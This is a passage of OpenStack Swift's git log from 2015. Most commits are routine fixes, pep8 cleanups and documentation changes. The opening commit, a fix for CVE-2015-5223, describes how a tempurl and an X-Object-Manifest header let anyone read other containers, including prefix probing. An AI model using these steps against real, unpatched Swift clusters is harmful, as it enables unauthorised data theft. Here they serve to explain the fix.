container, and it does all its work therein using those keys. The user
expects that, if the application is compromised, then the attacker
only gains access to the "compromised-container". However, with the old
behavior, the attacker could read data from \*any\* container like so:
1) Choose a "victim-container" to download
2) Create PUT and GET tempurl for any object name within the
"compromised-container". The object doesn't need to exist;
we'll create it.
3) Using the PUT tempurl, upload a DLO manifest with
"X-Object-Manifest: /victim-container/"
4) Using the GET tempurl, download the object created in step 3. The
result will be the concatenation of all objects in the
"victim-container".
Step 3 need not be for all objects in the "victim-container"; for
example, a value "X-Object-Manifest: /victim-container/abc" would only
be the concatenation of all objects whose names begin with "abc". By
probing for object names in this way, individual objects may be found
and extracted.
A similar bug would exist for manifests referencing other accounts
except that neither the X-Object-Manifest (DLO) nor the JSON manifest
document (SLO) have a way of specifying a different account.
This change makes it so that a container tempurl only grants access to
objects within its container, \*including\* large-object segments. This
breaks backward compatibility for container tempurls that may have
pointed to cross container \*LO's, but (a) there are security
implications, and (b) container tempurls are a relatively new feature.
This works by having the tempurl middleware install an authorization
callback ('swift.authorize' in the WSGI environment) that limits the
scope of any requests to the account or container from which the key
came.
This requires swift.authorize to persist for both the manifest request
and all segment requests; this is done by having the proxy server
restore it to the WSGI environment prior to returning from \_\_call\_\_.
[CVE-2015-5223]
Co-Authored-By: Clay Gerrard <clayg@swiftstack.com>
Co-Authored-By: Alistair Coles <alistair.coles@hp.com>
Co-Authored-By: Christian Schwede <cschwede@redhat.com>
Co-Authored-By: Matthew Oliver <matt@oliver.net.au>
Change-Id: Ie6d52f7a07e87f6fec21ed8b0ec1d84be8b2b11c
Closes-Bug: 1449212
commit 10b2939b433a4a79b4f7b97640b3d208cacfeffb
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Thu Jul 23 22:36:21 2015 -0700
Disallow unsafe tempurl operations to point to unauthorized data
Do not allow PUT tempurls to create pointers to other data. Specifically
disallow the creation of DLO object manifests by returning an error if a
non-safe tempurl request includes an X-Object-Manifest header regardless of
the value of the header.
This prevents discoverability attacks which can use any PUT tempurl to probe
for private data by creating a DLO object manifest and then using the PUT
tempurl to head the object which would 404 if the prefix does not match any
object data or form a valid DLO HEAD response if it does.
This also prevents a tricky and potentially unexpected consequence of PUT
tempurls which would make it unsafe to allow a user to download objects
created by tempurl (even if they just created them) because the result of
reading the object created via tempurl may not be the data which was uploaded.
[CVE-2015-5223]
Co-Authored-By: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Change-Id: I11e68830009d3f6bff44ae4011a41b67139146f6
Closes-Bug: 1453948
commit c690bcb68331818a04c94741b25f40cc40f7b3c4
Author: Kazuhiro MIYAHARA <miyahara.kazuhiro@lab.ntt.co.jp>
Date: Mon Aug 17 16:50:56 2015 +0900
Fix dispersion-reports error message
This patch fixes Swift to show message
"No objects to query. Has swift-dispersion-populate been run?"
for "swift-dispersion-report —object-only”
with no container for object dispersion.
Change-Id: I82da56709cfc296a27f5180681709bc56adbc13d
Closes-Bug: #1468120
commit 8086a0e53406dc95856df2d3e015d3eaaf81380a
Author: Tushar Gohad <tushar.gohad@intel.com>
Date: Tue Aug 18 07:24:19 2015 +0000
Restrict PyECLib version to 1.0.7
v1.0.9 rev of PyECLib replaces Jerasure with a native EC
implementation (liberasurecode\_rs\_vand) as the default
EC scheme. Going forward, Jerasure will not be bundled
with PyPI version of PyECLib as it used to be, until
v1.0.7.
This is an interim change to Swift requirements until we
get v1.0.9 PyECLib included into global-requirements and
ready patches that change Swift default ec\_type (for doc,
config samples and unit tests) from "jerasure\_rs\_vand"
to "liberasurecode\_rs\_vand."
Change-Id: Ica4fee2cdea2bc7f5edd0e51ad637a4457faf3b4
commit 17efa343c605d0361b3f423696babbab3f3d972d
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Mon Jul 6 13:21:40 2015 -0700
Fix EC GET backend stream iteration state
In EC case, When GET object requested, proxy-server always makes a log
line "Client disconnected on read" even though the request succeeded.
That is because ECAppIter class doesn't maintain a bunch of backend
stream when closing the app\_iter. It will cause unfortunately
GeneratorExit on backend stream ResumingGetter.
This patch fixes to set non\_client\_disconnected to propagate the state
to the backend streams when the range iteration stopped successful.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Change-Id: I77af9807816bea1444d66534a17e2a210bcf09f8
Closes-Bug: #1472201
commit 25dc7224b63b039cb3778cca7f9f81f954c6d94e
Author: Alistair Coles <alistair.coles@hp.com>
Date: Tue Aug 25 11:05:41 2015 +0100
Fix swob.Range docstring
Bad ranges cause a ValueError to be raised, not an empty
ranges list.
Change-Id: I118bd2f7dc08ff5198870f4093c6eb350506c8ed
commit a7b84f4c51207608adc3a5de7f4f9a629053c0ab
Author: Samuel Merritt <sam@swiftstack.com>
Date: Mon Aug 24 23:11:34 2015 -0700
Allow pep8 of a single file
Now you can run
$ tox -e pep8 path/to/file.py [path/to/file2.py [...]]
to run pep8 against just those files[1]. This is quite a bit faster
than a full pep8 run, and the faster feedback is nice when you're
fiddling with some formatting to placate pep8.
Of course, you can still run "tox -e pep8" to check the whole source
tree, just as before this commit.
[1] It'll still run against bin/swift\* as well, but that's still a lot
faster than running against all our .py files.
Change-Id: I81b4363fb95a34ff0f5c346b2b24f2047154f502
commit 6a35d479e8952c854fee6fbef9fe0397a289a6e5
Author: Matthew Oliver <matt@oliver.net.au>
Date: Tue Aug 25 11:24:49 2015 +1000
Follow up patch to fix a multiline import NITPIC
This change cleans up test/unit/obj/test\_replicator.py's imports
to use only 1 version of multiline import syntaxes (' \' vs '()').
I don't really mind which, but we should be consistant, at least
in the same file.
This is a follow up for patch 215857.
Change-Id: Ie2d328c25865b19092c493981a803ee246a9d7a5
commit edde5584affaa983d8db1d294bf1e20a2d4bbb50
Author: Hisashi Osanai <osanai.hisashi@jp.fujitsu.com>
Date: Tue Aug 25 07:52:18 2015 +0900
Fix typo of a comment in replicator
The typo was introduced by patch 138342 (sorry) so I fix it.
Change-Id: Id5126802d281ef7ee9be128bd2152c0d2584160e
commit 6151c6c45da481c0ea9a4fb876d14b39c1e347bf
Author: Tim Burke <tim.burke@gmail.com>
Date: Mon Aug 24 20:36:22 2015 +0000
Fix use of delimiter in account listings
Previously, account listings that used the delimiter query param could
omit some containers if they ended with the character that follows the
delimiter.
See If196e3075612b121ef8da4a9128167d00a248c27 for the corresponding fix
for container listings.
Change-Id: I57fcb97e51f653f5f4e306a632fcb3a0fb148c4e
commit a38f63e1c6b8b85b1675aa900e239a2e9906811e
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Aug 21 18:14:55 2015 -0700
Use correct Storage-Policy header for REPLICATE requests
Under some concurrency the object-replicator could potentially send the
wrong X-Backed-Storage-Policy-Index header to it's partner nodes during
replication if there were multiple storage policies on the same node
because of a race where multiple jobs being processed concurrently would
mutate some shared state on the ObjectReplicator instance.
Instead of using shared stated on the ObjectReplicator instance when
mutating the default headers send with REPLICATION requests each job
will copy them into a local where they can safely be updated.
Change-Id: I5522db57af7e308b1f9d4181f14ea14e386a71fd
commit ae129bf5e8c918efd8ee66279f98ee85e7c97b24
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Fri May 15 06:44:12 2015 -0700
eventlet.posthook related code needn't anymore
In the past, older Swift seemed to use eventlet.posthooks scheme for the
logging on proxy with posthooklogger method. However, for now, Swift
attaches no method to eventlet.posthooks everywhere so we don't have
to maintain the posthooks anymore.
Change-Id: Ie63941a202d448532d980252a4d25575f8edab9c
commit 4500ff340f021e4e5f6fd53960de03cb3c207925
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Wed May 13 00:43:59 2015 -0700
Fix the missing SLO state on fast-post
When using fast-post and POST (i.e. metadata update) is requested to
a SLO manifest files, current Swift drops the 'X-Static-Large-Object'
header from the existing metadata. It results in breaking the SLO
state because the manifest missing the 'X-Static-Large-Object' metadata
will be maintained as a normal files.
This patch fixes object-server to keep the existing
'X-Static-Large-Object' flag and then keep the SLO state.
Change-Id: Ib1eb569071372c322dd105c52baeeb094003291e
Closes-bug: #1453807
commit 69e7424d3cb6c59341d739c3d41f42397031d96a
Author: Eran Rom <eranr@il.ibm.com>
Date: Tue Jul 28 09:41:12 2015 +0300
Add container sync probe test to SAIO default set
SAIO Configuration and documentation changes enabling to run the
container sync probe test by default
Change-Id: Iccf59533d0d4fe72549d318339ab125d04dde006
Related-Bug: #1476623
commit 8b1df9918bf6c22b49b161a402199b532bfd8266
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Fri Aug 21 14:04:46 2015 -0700
Minor cleanup handoff mode warnings
\* message is a little clearer
\* test is a little stronger
Change-Id: I745cde7f4a46dafc80ab42d39e6ccc92aa3b746e
commit a1ceab5a92dfdafd5abffed272ac2cece5302f32
Author: Carlos Cavanna <ccavanna@ca.ibm.com>
Date: Fri Aug 21 14:14:31 2015 -0400
New troubleshooting case in documentation.
Added a new troubleshooting case for the "First Contribution to Swift"
documentation page.
Change-Id: I182ba702b49b28409fe56becae93326e5f63dcd0
commit ab163702de733be39ba5e7024c7a8dd4c86bc29b
Author: Pradeep Kumar Singh <pradeep.singh@nectechnologies.in>
Date: Tue Jul 14 10:03:18 2015 +0530
Emit warning log in object replicator
When the object-replicator encounters handoffs\_first and
handoff\_delete options as enabled it should emit a log
warning indicating that it should be changed back to the
default before the next "normal" rebalance.
Closes-Bug: #1457262
Change-Id: If9dc2796c18ed3cf13da920831e2d5c2ae9f12a0
commit be66aa8e76d2994eb8a0a944e0dea26ffbb3c159
Author: Samuel Merritt <sam@swiftstack.com>
Date: Thu Aug 20 13:24:38 2015 -0700
Fix 500 for bogus Range request to 0-byte object.
The proxy was trying to pop a byterange off a Range header that didn't
contain syntactically-valid byteranges. This worked about as well as
you'd expect. Now we detect the bogus value and remove the header
entirely.
Change-Id: I24b92f900d33ec79880c7db2870378489d5a6810
commit 4b6836b3bc465e9c2c6d2974c193a49b973c4e4e
Author: Akihito Takai <takaiak@nttdata.co.jp>
Date: Thu Aug 20 18:40:52 2015 +0900
Fix the comment in [1].
(line 259) parameter(op) of object\_update method is 'PUT' or
'DELETE' not 'POST' or 'DELETE'.
[1]: swift/obj/updater.py
Change-Id: I876a620ba8e09e69fba7156b12e69445c229e160
commit 923238aa1ba0963c414ba5321cd3910b2910f4ed
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Tue Jul 28 20:35:25 2015 +0530
test/(functional/probe):Replace python print operator with print function (pep H233, py33)
'print' function is compatible with 2.x and 3.x python versions
Link : https://www.python.org/dev/peps/pep-3105/
Python 2.6 has a \_\_future\_\_ import that removes print as language syntax,
letting you use the functional form instead
Change-Id: I416c6ac21ccbfb91ec328ffb1ed21e492ef52d58
commit 47dc31940d64b0c87e99cc73eddcdd01dd8b3ad4
Author: Samuel Merritt <sam@swiftstack.com>
Date: Wed Aug 19 10:42:28 2015 -0700
Add OpenStack release names to changelog
I can never remember the mapping of real version numbers to the
OpenStack names.
Change-Id: Ib7c5ae4ff2a33018364698eb34f8df1622719fab
commit 183508710d011ec30ebba2186c58fd28d449e4bb
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 11:18:49 2015 +0200
pep8: Don't override '\_' symbol
Fix pep8 warning F402 "import '\_' from line 51 shadowed by loop
variable".
Change-Id: I139060ff5d298a8b0f0f8e529a5737478fb5daf5
commit c7eb589c6ca2fe4f2950cae22a18513e4dec6c46
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 11:06:52 2015 +0200
pep8: Fix usage of the l10n \_('...') function
Fix the pep8 warning H702 "Formatting operation should be outside of
localization method call".
For the logger, pass parameters as indexed parameters instead of using
the string str%args operator, the logger is more reliable in case of
formatting error.
Change-Id: If418bc155f6a6c0a00f63e3d87ebe4addf4aae55
commit 7bea148d2fe22daa9d1fbbc5cd16ebd390b64b1b
Author: Victor Stinner <vstinner@redhat.com>
Date: Sun Aug 16 10:34:26 2015 +0200
pep8: replace deprecated calls to assert\_()
The TestCase.assert\_() has been deprecated in Python 2.7. Replace it
with assertTrue() or even better methods (assertIn, assertNotIn,
assertIsInstance) which provide better error messages.
Change-Id: I21c730351470031a2dabe5238693095eabdb8964
commit 8aaacbf88d9ea4432e58dd261b98ff95d7c69be6
Author: Victor Stinner <vstinner@redhat.com>
Date: Mon Jul 27 18:55:01 2015 +0200
pep8: Fix hacking H232 warnings (octal)
Fix warnings "H232: Python 3.x incompatible octal 000001234 should be
written as 0o1234".
Change-Id: I9a7bbb034357783885ac3e18fe1e9e32a5951616
commit d6267c1f95a7fcd2b0e4f15d5efc6bcfe2114de0
Author: Clément Contini <ccontini@cloudops.com>
Date: Wed Aug 12 15:00:45 2015 -0400
Keep user id and project id in subrequests env
Keep HTTP\_X\_USER\_ID and HTTP\_X\_PROJECT\_ID to be available as
user\_id and project\_id in storage.objects.outgoing.bytes in
ceilometer when downloading a multipart object.
Change-Id: I0f4734f021e5d6e84d48ed9bebeb321d7a9590ad
Closes-Bug: #1477283
commit eaa006464cb98a2f36809edfa13bd3dcaebc9952
Author: John Dickinson <me@not.mn>
Date: Mon Aug 17 22:13:42 2015 -0700
move global statement up a few lines
Change-Id: I190d2d530c6c0525d988cc88b0965b48a291fffb
commit 1a81cda8b7eba0d25ea7341da756bb588cae8d73
Author: Hamdi Roumani <roumani@ca.ibm.com>
Date: Mon Aug 3 17:45:56 2015 -0400
Doc instructions for post rebase steps
Improve the 'first\_contribution\_swift' by adding instructions for how to
rebuild swift following a rebase.
Change-Id: If5c91dc4e1e8d1712bbd8b326c675967fb4b8c15
commit 79ba4a85983641e539b620bd143e62673c98416e
Author: Hisashi Osanai <osanai.hisashi@jp.fujitsu.com>
Date: Wed Dec 3 06:15:16 2014 +0900
Enable Object Replicator's failure count in recon
This patch makes the count of object replication failure in recon.
And "failure\_nodes" is added to Account Replicator and
Container Replicator.
Recon shows the count of object repliction failure as follows:
$ curl http://<ip>:<port>/recon/replication/object
{
"replication\_last": 1416334368.60865,
"replication\_stats": {
"attempted": 13346,
"failure": 870,
"failure\_nodes": {
"192.168.0.1": {"sdb1": 3},
"192.168.0.2": {"sdb1": 851,
"sdc1": 1,
"sdd1": 8},
"192.168.0.3": {"sdb1": 3,
"sdc1": 4}
},
"hashmatch": 0,
"remove": 0,
"rsync": 0,
"start": 1416354240.9761429,
"success": 1908
},
"replication\_time": 2316.5563162644703,
"object\_replication\_last": 1416334368.60865,
"object\_replication\_time": 2316.5563162644703
}
Note that 'object\_replication\_last' and 'object\_replication\_time' are
considered to be transitional and will be removed in the subsequent
releases. Use 'replication\_last' and 'replication\_time' instead.
Additionaly this patch adds the count in swift-recon and it will be
showed as follows:
$ swift-recon object -r
========================================================================
=======
--> Starting reconnaissance on 4 hosts
========================================================================
=======
[2014-11-27 16:14:09] Checking on replication
[replication\_failure] low: 0, high: 0, avg: 0.0, total: 0, Failed: 0.0%,
no\_result: 0, reported: 4
[replication\_success] low: 3, high: 3, avg: 3.0, total: 12,
Failed: 0.0%, no\_result: 0, reported: 4
[replication\_time] low: 0, high: 0, avg: 0.0, total: 0, Failed: 0.0%,
no\_result: 0, reported: 4
[replication\_attempted] low: 1, high: 1, avg: 1.0, total: 4,
Failed: 0.0%, no\_result: 0, reported: 4
Oldest completion was 2014-11-27 16:09:45 (4 minutes ago) by
192.168.0.4:6002.
Most recent completion was 2014-11-27 16:14:19 (-10 seconds ago) by
192.168.0.1:6002.
========================================================================
=======
In case there is a cluster which has servers, a server runs with this
patch and the other servers run without this patch. If swift-recon
executes on the server which runs with this patch, there are unnecessary
information on the output such as [failure], [success] and [attempted].
Because other servers which run without this patch are not able to
send a response with information that this patch needs.
Therefore once you apply this patch, you also apply this patch to other
servers before you execute swift-recon.
DocImpact
Change-Id: Iecd33655ae2568482833131f422679996c374d78
Co-Authored-By: Kenichiro Matsuda <matsuda\_kenichi@jp.fujitsu.com>
Co-Authored-By: Brian Cline <bcline@softlayer.com>
Implements: blueprint enable-object-replication-failure-in-recon
commit eeb0fa40a19917e6548f95f0bd3c08736928449b
Author: Christian Schwede <cschwede@redhat.com>
Date: Thu Aug 6 07:21:15 2015 +0000
Make swift-ring-builder filename usage more consistent
Sometimes the given argument is internally altered and another filename is used
without a note to the operator. Even worse, a given .ring.gz filename is
sometimes written out as builder file, without updating the corresponding
.builder file.
There is already a method to parse the given argv and return the name of the
builder and ring file. However, it's rarely used and no warning is given to the
user if it is altered. This patch uses the already parsed builder and ring file
name instead of argv[1], and also adds a note to the user if the used filename
is differently to the one given as argument.
Closes-Bug: 1482096
Change-Id: I2f8ef23aeab8b07caaa799f7dcd57e684b4b2ad2
commit b75d2a4e37d4c86763a2cc56c6dd53ebe2e0de19
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Mon Aug 17 13:54:44 2015 -0500
Quorum on durable response is too low
Increase the .durable quorum from 2 to "parity + 1" to guarantee
that we will never fail to rebuild an object. Otherwise, with
low durable responses back (< parity + 1), the putter objects
return with failed attribute set to true, thereby failing the
rebuild of fragments for an object.
Change-Id: I80d666f61273e589d0990baa78fd657b3470785d
Closes-Bug: 1484565
commit fa35e38c9f83f704eb087f80157cbe33b23b9db2
Author: Kai Zhang <zakir.exe@gmail.com>
Date: Fri Aug 14 16:46:35 2015 -0700
Fix some minor typos
Fixed some typos in function name and comments.
Change-Id: Ida76ab4b331a51b71e57650702acc136e66ba4b2
commit 5b246e875fe9ac3d764ea581ad52b04238f5bcc8
Author: Kota Tsuyuzaki <tsuyuzaki.kota@lab.ntt.co.jp>
Date: Wed Jul 22 10:39:22 2015 -0700
Fix EC range GET/COPY handling
When range GET (or COPY) for an EC object requested, if the requested range
starts from more than last segments alignment (i.e.
ceil(object\_size/segment\_size) \* segment\_size), proxy server will return
the original content length w/o body, though Swift should return an error
massage as a body and the length of message as the content length.
The current behavior will cause stuck on some client. (e.g. curl)
This patch fixes that proxy enables to return correct response, even if such
an over range requested.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
Change-Id: I21f81c842f563ac4dddc69011ed759b744bb20bd
Closes-Bug: #1475499
commit 7064706b2721c36c5181267f58704b9344ad4ac0
Author: Samuel Merritt <sam@swiftstack.com>
Date: Tue Aug 11 10:17:20 2015 -0500
Fix 500 in versioned writes with bad Destination
When this code lived in the proxy, it was protected by an "except
HTTPException" clause in proxy.Application.handle\_request(). When it
moved to middleware, it lost that, and then things like
constraints.check\_name\_format that raised HTTPException would cause
500s. The HTTPException would make it all the way out to catch\_errors
and get translated to a 500.
This commit just wraps a couple try/excepts around the bits in
versioned writes that can raise HTTPException. I tried to make it use
wsgify so I could get that for free, but that wound up being a real
pain because env/start\_response are plumbed through pretty much the
whole versioned-writes middleware.
Closes-Bug: 1483705
Change-Id: Ife165bf709e64f313ed07c779b21914045e51f25
commit 035a411660ca02983cd486312266c67d78a2359c
Author: Thiago da Silva <thiago@redhat.com>
Date: Sun Nov 9 13:13:27 2014 -0500
versioned writes middleware
Rewrite object versioning as middleware to simplify the PUT method
in the object controller.
The functionality remains basically the
same with the only major difference being the ability to now
version slo manifest files. dlo manifests are still not
supported as part of this patch.
Co-Authored-By: Clay Gerrard <clay.gerrard@gmail.com>
DocImpact
Change-Id: Ie899290b3312e201979eafefb253d1a60b65b837
Signed-off-by: Thiago da Silva <thiago@redhat.com>
Signed-off-by: Prashanth Pai <ppai@redhat.com>
commit 968c91a465627bb9317ed6e2ae9ccd818c83c0c4
Author: Alistair Coles <alistair.coles@hp.com>
Date: Tue Jul 28 10:31:54 2015 +0100
Replace assertTrue(not <condition>) with assertFalse(<condition>)
The replacement of assert\_ with assertTrue [1] resulted in a number of
tests using calls of the form assertTrue(not <condition>). This patch
replaces those with assertFalse(<condition>).
[1] change I74705c6498249337bfdf955d62e0ad972035bc1f
Change-Id: I78b49558f4425c2335df187b1793d1e4b3c514b1
commit 4ac1fea5d111c669ff827f4eb29c0735cbad6ba5
Author: Zhao Lei <zhaolei@cn.fujitsu.com>
Date: Fri Aug 7 22:07:01 2015 +0800
Fix some spelling typo in comments
s/overide/override for object-expirer.conf and sample.
s/automaticaly/automatically for swift/proxy/controllers/obj.py
Change-Id: Ife107c7a1005a5d4959288db50a7f8f33c522dd4
Signed-off-by: Zhao Lei <zhaolei@cn.fujitsu.com>
commit 9456af35a2832aeafc4a4e78ebd0d4142ead71cd
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Thu Aug 6 00:55:36 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3,changes in
dir:
\*test/unit/obj/\*
\*test/unit/test\_locale/\*
Change-Id: I3dd0c1107165ac529f1cd967363e5cf408a1d02b
commit 1952451ed7e97e2bfa3b11dfa5000cc39f712084
Author: Zhao Lei <zhaolei@cn.fujitsu.com>
Date: Fri Aug 7 21:57:08 2015 +0800
Fix a spelling typo in comment
s/automaticaly/automatically/ for swift/proxy/controllers/obj.py
Change-Id: I405441383739637e0b13746d6f4e2bad1c874b4d
Signed-off-by: Zhao Lei <zhaolei@cn.fujitsu.com>
commit c35cc13b8abeb97400632cbe8ec56fc1040d8210
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Thu Aug 6 10:01:17 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/unit/proxy/\*
Change-Id: Ie2c7e73e1096233a10ee7fbf6f88386fa4d469d6
commit 239e94e62518f36601fb18119700269753d02a01
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Thu Aug 6 09:28:51 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/probe/\*
Change-Id: Ie08dd7a8a6c48e3452dfe4f2b41676330ce455d5
commit 49b9ba37ac522502ccad66fba7bfef375eab145d
Author: Bill Huber <wbhuber@us.ibm.com>
Date: Wed Aug 5 14:51:32 2015 -0500
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in the following dir:
test/functional/\*
Change-Id: Iee7f8ffca9838ccc521107180697d91ac9559405
commit 81816bebe6b3506af8cabaa7ebe265c70f3499cd
Author: kenichiro matsuda <matsuda\_kenichi@jp.fujitsu.com>
Date: Thu Aug 6 10:13:02 2015 +0900
Fix shebang of commands
Fix shebang of following commands.
$ grep '#!/usr/bin/python' swift/bin/\*
swift/bin/swift-account-info:#!/usr/bin/python
swift/bin/swift-container-info:#!/usr/bin/python
swift/bin/swift-container-sync:#!/usr/bin/python
swift/bin/swift-recon:#!/usr/bin/python
swift/bin/swift-ring-builder:#!/usr/bin/python
swift/bin/swift-ring-builder-analyzer:#!/usr/bin/python
Change-Id: I564d1d8abd76eba57730fc2f30263b0a0f809867
Closes-Bug: #1481623
commit 652f0f9da408e955843f87a504b3dab5be3cff80
Author: Pete Zaitcev <zaitcev@kotori.zaitcev.us>
Date: Wed Aug 5 15:33:29 2015 -0600
Having said H, I, J, we ought to say K
In the long run, we might want to stop these updates. But this
decision is above my pay grade.
Change-Id: I335558e1da8052be1b215fbad51244b47af3d81b
commit ed3aec2146b114c85bb3b196c999bf3f44fe159e
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Thu Aug 6 00:18:52 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in
dir: test/unit/container/\*
Change-Id: I3333022ed63ce03198bc73147246d91d2442a440
commit f449e914728fdcaf0870c15b9fc5ebd16a9df916
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Wed Aug 5 22:32:02 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3, fixing in:
dir: test/unit/cli/\*
Change-Id: I9a2fc1f717beafd5fa8408942046e310e8de0318
commit 6594bbebb582801c069c4966352fee19eadef2f8
Author: janonymous <janonymous.codevulture@gmail.com>
Date: Wed Aug 5 22:25:46 2015 +0530
pep8 fix: assertEquals -> assertEqual
assertEquals is deprecated in py3 in
dir : test/unit/account/\*
Change-Id: I70415197df1b0d58d4d6e219733c13a9c9cdfff7
commit 89f59062864e5cbfc839a6084c323ce35438aa57
Author: Ben Martin <blmartin@us.ibm.com>
Date: Mon Jul 27 14:19:09 2015 -0500
+Document method to avoid rsync filling root drive
When rsync pushes to a remote node with an unmounted drive and if
certain steps are not taken, rsync may attempt to write files to
the local drive at the location where the drive was mounted.
There are two suggested solutions for this issue:
1) Set the permissions for all mount points in /srv/node/
to root:root 755
2) Mount the drives elsewhere and symlink the drives to /srv/.../
The first method ensures that only root and not the swift user
can write in the /srv/.../ directories.
The second method will prompt a broken link issue if rsync
attempts to write to an unmounted drive.
Change-Id: I60ce4ed9ef8401768d5f78b6806cbb2e2a65303e
Closes-Bug: #1470576
commit f0d51882b921075f5309ed6ff07385dc6103d4dc
Author: Charles Hsu <charles0126@gmail.com>
Date: Wed Aug 5 22:09:40 2015 +0800
Add extra\_header\_count to document and config.
Change-Id: Iec86b488d71553c295afe7098822ce2046df9546
commit 7071762d3698c59fabdee76890e300f81417be74
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Tue Aug 4 23:15:37 2015 -0700
Fix TypeError if backend response doesn't have expected headers
There was some debug logging mixed in with some error handling on PUTs
that was relying on a very specific edge would only encounter a set of
backend responses that included the expected set of headers to diagnoise
the failure.
But the backend responses may not always have the expected headers.
The proxy debug logging should be more robust to missing headers.
It's a little hard to follow, but if you look `\_connect\_put\_node` in
swift.proxy.controller.obj - you'll see that only a few connections can
make their way out of the initial put connection handling with a "resp"
attribute that is not None. In the happy path (e.g. 100-Continue) it's
explictly set to None, and in most errors (Timeout, 503, 413, etc) a new
connection will be established to the next node in the node iter.
Some status code will however allow a conn to be returned for validation
in `\_check\_failure\_put\_connections`, i.e.
\* 2XX (e.g. 0-byte PUT would not send Expect 100-Continue)
\* 409 - Conflict with another timestamp
\* 412 - If-None-Match that encounters another object
... so I added tests for those - fixing a TypeError along the way.
Change-Id: Ibdad5a90fa14ce62d081e6aaf40aacfca31b94d2
commit 01848c565e5821d2500cb234261c70871e562ebe
Author: David Goetz <dpgoetz@gmail.com>
Date: Fri Jun 26 17:27:31 2015 -0700
Speed up reaper for a big account delete and some better error handling
In run\_forever mode, run the reaper on all three copies of the account
DB instead of just the first one and shard the containers between them.
Change-Id: Id182e89dad70df9d6d9988523861b8085d74c765
commit 5b24b2249878e25ee702ee4237227c984036c6ec
Author: OpenStack Proposal Bot <openstack-infra@lists.openstack.org>
Date: Tue Aug 4 06:29:11 2015 +0000
Imported Translations from Transifex
For more information about this automatic import see:
https://wiki.openstack.org/wiki/Translations/Infrastructure
Change-Id: I9f0e5fd25ec143fb87de1895794764dea4587f93
commit 8d06f56c1fac23bca463d3a93353da6b50ad5bed
Author: Takashi NATSUME <natsume.takashi@lab.ntt.co.jp>
Date: Tue Aug 4 10:14:25 2015 +0900
Fix typo of 'receive'
Change-Id: Ic01defa8d48ba4b7f4bd6cbe4d59b9bab468a36c
commit 310ac18d61b001bdf297505243d8aa62e8fde8fe
Author: Brian Reitz <brian.reitz@oracle.com>
Date: Mon Aug 3 16:28:31 2015 -0500
Convert docstring to a comment in test\_denied\_DELETE\_of\_versioned\_object unit test.
Docstrings cause issues for nose and created non standard test output for this test.
Change-Id: I91e6450480567de0ee0b18d3efae01a4b94f0a86
commit 21a7b4aaa6f991c0eeb8f74876b14fe22713586b
Author: Alistair Coles <alistair.coles@hp.com>
Date: Mon Aug 3 14:58:24 2015 +0100
Test that get\_hashes ignores only removed hash dir
Add test for case not yet covered by unit tests: suffix dir
has two hash dirs, one with expired tombstone. That hash dir gets
removed and its hash is not included in the suffix hash, but the
remaining hash dir's hash is reported.
Change-Id: I031a022daed6b8a66dfd04bea1b4d5eebcb882b3
commit 44917c8a90e79a85cd6c6821d8b6d043f83b322d
Author: Clay Gerrard <clay.gerrard@gmail.com>
Date: Mon Jul 20 13:06:48 2015 -0700
Handle removed suffix dirs the same as empty suffix dirs
When hashes suffix dirs, the directory might have gotten cleaned up while
still appearing in hashes.pkl. It would even get cleaned up the next time.
For example, given this really old tombstone:
objects/846/3d0/d3a20154d0a828a032aba6860397c3d0/1432267961.41808.ts
Prior to this commit, a call to get\_hashes() would reap the old
tombstone and any empty containing dirs, but the resulting hashes.pkl
would still contain {'3d0': 'd41d8cd98f00b204e9800998ecf8427e'} even
though there's no such suffix dir any more.
("d41d8cd98f00b204e9800998ecf8427e" is the MD5 of the empty string.)
Then, a \*subsequent\* get\_hashes() call would omit 3d0 from the resulting
hash, so then hashes.pkl would no longer contain 3d0. This difference
would result in a little useless replication traffic while nodes without
a particular part/suffix pair, but who disagreed on how that showed up
in hashes.pkl, tried to push their version of nothing to one another.
Now, an empty suffix dir doesn't appear in hashes.pkl at all, whether
it's for replication or EC, or whether it's for the get\_hashes() call
that reaped the suffix dirs or not.
Co-Author: Samuel Merritt <sam@swiftstack.com>
Change-Id: Ie1bfb1cc56d0fc030c6db42f97b55d140695cf1f
commit cf4d50bd68b658d35759fb56446557858dcd9572
Author: Alistair Coles <alistair.coles@hp.com>
Date: Fri Jun 5 13:06:29 2015 +0100
Make test\_proxy work independent of env vars
test.unit.common.test\_internal\_client.TestSimpleClient.test\_proxy
will fail if the environment has http\_proxy set and does not have
no\_proxy=127.0.0.1 set. This seems to be because urllib overrides
any proxy arg passed to the Request with the env http\_proxy var,
unless the Request host is in no\_proxy.
We don't need to test urllib, so this patch changes the test to
simply ensure that swift code does pass the correct proxy arg to
urllib2.urlopen. That avoids testers having to make sure their
env vars are compliant to successfully run unit tests. While it is
reasonable to think that 127.0.0.1 is in the no\_proxy list, it
shouldn't be a requirement pass swift tests.
Change-Id: Iff91acdb76fabe7056b3e90e2756e27fe5105817
commit 67513fc17c23066f6547b5e3c4ab2dc852e4f7f0
Author: janonymous <janonymous.codevulture@gmail.com>
